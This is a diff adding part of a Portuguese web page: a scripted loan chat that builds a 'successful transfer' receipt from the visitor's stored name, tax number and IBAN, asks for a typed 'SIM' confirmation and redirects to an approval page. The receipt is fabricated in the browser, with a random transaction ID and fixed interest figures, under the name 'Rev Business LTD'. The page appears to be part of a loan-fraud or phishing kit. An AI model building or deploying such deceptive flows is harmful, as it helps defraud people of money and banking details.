+    addThem('Ótimo! Agora escolha em quantas vezes você quer pagar:', function(){
+      renderParcelas(principal);
+    });
+  });
+
+  // --- Comprovativo de transferência ---
+  function renderReceipt(principal, n, valorParcela, valorTotal){
+    var nomeCli = (localStorage.getItem('nome') || 'cliente').trim();
+    var nomeShort = nomeCli.split(/\s+/).slice(0,2).join(' ').toLowerCase();
+    var nifCli = (localStorage.getItem('nif') || '').replace(/\D/g,'');
+    var banco = localStorage.getItem('bancoDestino') || 'Outro Banco';
+    var ibanCli = localStorage.getItem('iban') || '';
+    var ibanFmt = ibanCli.replace(/\s/g,'').toUpperCase().match(/.{1,4}/g);
+    ibanFmt = ibanFmt ? ibanFmt.join(' ') : ibanCli;
+    var d = new Date();
+    var dd = ('0'+d.getDate()).slice(-2)+'/'+('0'+(d.getMonth()+1)).slice(-2)+'/'+d.getFullYear();
+    var hh = ('0'+d.getHours()).slice(-2)+':'+('0'+d.getMinutes()).slice(-2);
+    var txId = 'E' + Math.floor(Math.random()*9e7+1e7).toString();
+
+    // Calcular TAN, TAEG, MTIC aproximados
+    var TAN  = 4.60;
+    var TAEG = 5.90;
+    var mtic = (valorParcela * n).toFixed(2);
+    var mticFmt = '€ ' + parseFloat(mtic).toLocaleString('de-DE', {minimumFractionDigits:2, maximumFractionDigits:2});
+
+    var html =
+      '<div class="row-i"><div class="k">Banco Destino</div><div class="vv">'+banco+'</div></div>' +
+      '<div class="row-i"><div class="k">Prestações</div><div class="vv">'+n+'x de '+fmtEUR(valorParcela)+'</div></div>' +
+      '<div class="row-i"><div class="k">TAN</div><div class="vv">'+TAN.toFixed(2)+'%</div></div>' +
+      '<div class="row-i"><div class="k">TAEG</div><div class="vv">'+TAEG.toFixed(2)+'%</div></div>' +
+      '<div class="row-i"><div class="k">MTIC</div><div class="vv">'+mticFmt+'</div></div>' +
+      '<div class="row-i"><div class="k">Data/Hora</div><div class="vv">'+dd+' '+hh+'</div></div>' +
+      '<div class="row-i"><div class="k">ID Transação</div><div class="vv">'+txId+'</div></div>' +
+      '<div class="foot"><b>Transferência realizada com sucesso</b>Rev Business LTD — Sucursal em Portugal</div>';
+
+    // Insere o comprovante dentro do fluxo de mensagens
+    var msgs = document.getElementById('messages');
+    var receiptRow = document.createElement('div');
+    receiptRow.style.cssText = 'width:100%;margin:4px 0;';
+    var receiptCard = document.createElement('div');
+    receiptCard.className = 'receipt';
+    receiptCard.style.display = 'block';
+    receiptCard.innerHTML = html;
+    receiptRow.appendChild(receiptCard);
+    msgs.appendChild(receiptRow);
+    window.scrollTo(0, document.body.scrollHeight);
+  }
+
+  // --- Confirmação SIM ---
+  function sendSim(){
+    var simInput = document.getElementById('simInput');
+    var val = simInput.value.trim().toUpperCase();
+    if(!val) return;
+    var txt = simInput.value.trim();
+    simInput.value = '';
+    // Mostra o nome do usuário + texto como bolha (igual ao print)
+    var msgs = document.getElementById('messages');
+    var row = document.createElement('div');
+    row.className = 'row me';
+    row.innerHTML = '<div class="bubble"><span style="display:block;font-size:11px;font-weight:700;color:rgba(255,255,255,.6);margin-bottom:2px">'+capName+'</span>'+txt+'<span class="time">'+now()+'</span></div>';
+    msgs.appendChild(row);
+    window.scrollTo(0, document.body.scrollHeight);
+
+    if(val === 'SIM'){
+      document.getElementById('simBox').style.display='none';
+
+      addTyping();
+      addThem('Perfeito! Agora vou finalizar sua análise...', function(){
+        setTimeout(function(){
+          var pp = new URLSearchParams(window.location.search);
+          redirectWithParams('aprovado.html');
+        }, 3000);
+      }, 700);
+    } else {
+      // Resposta se digitou algo errado
+      addTyping();
+      addThem('Por favor, confirme digitando exatamente <strong>SIM</strong> para prosseguir.', function(){
+        document.getElementById('simInput').focus();
+      }, 600);
+    }
+  }
+
+  // Attach listeners after DOM ready (simBox is after script in DOM)
+  window.addEventListener('DOMContentLoaded', function(){
+    var si = document.getElementById('simInput');
+    var sb = document.getElementById('simBtn');
+    if(si) si.addEventListener('keydown', function(e){ if(e.key==='Enter') sendSim(); });
+    if(sb) sb.addEventListener('click', sendSim);
+  });
+
+})();
+
+</script>
+
+
+<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'},{'ap':'cpsh-oh'},{'server':'sxb1plzcpnl503952'},{'dcenter':'sxb1'},{'cp_id':'10972497'},{'cp_cl':'8'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src="js/scc-c2.min.js"></script>
+
+<div class="legal-footer">
+  <div class="legal-footer__company">Rev Business LTD</div>
+  <div>Avenida da Liberdade, 110, 1269-046 Lisboa, Portugal</div>
+  <div class="legal-footer__links">
+    <a href="termos-de-uso.html">Termos de Uso</a>
+    <a href="politica-de-privacidade.html">Política de Privacidade</a>
+  </div>
+</div>
+
+</body></html>
